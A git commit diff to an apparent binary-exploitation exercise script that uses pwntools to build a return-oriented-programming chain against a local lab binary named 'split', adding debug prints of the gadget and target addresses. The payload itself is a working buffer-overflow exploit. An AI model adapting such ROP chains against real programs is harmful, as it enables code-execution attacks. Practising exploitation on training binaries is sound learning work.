b8b4307780990ddaefdab36821e8a4a822012043
cristiandrami <cristiandramisino@libero.it>
2024-02-07 12:51:11 +0100

    added new exercises binary

--- execrises_binary/esercizi/split/sbunno.py
+++ execrises_binary/esercizi/split/sbunno.py
@@ -8,7 +8,12 @@ e = ELF('./split')
 r = ROP(e)
 gadget = r.find_gadget(['pop rdi', 'ret'])
 print(hex(e.symbols['usefulString']))
+print(p64(gadget[0]))
+print(p64(e.symbols['usefulString']))
+print(p64(0x000000000040074b))
+
 p.sendline(junk + p64(gadget[0]) + p64(e.symbols['usefulString']) + p64(0x000000000040074b))
+
 print(p.recvline())
 p.interactive()
 #0x000000000040074b
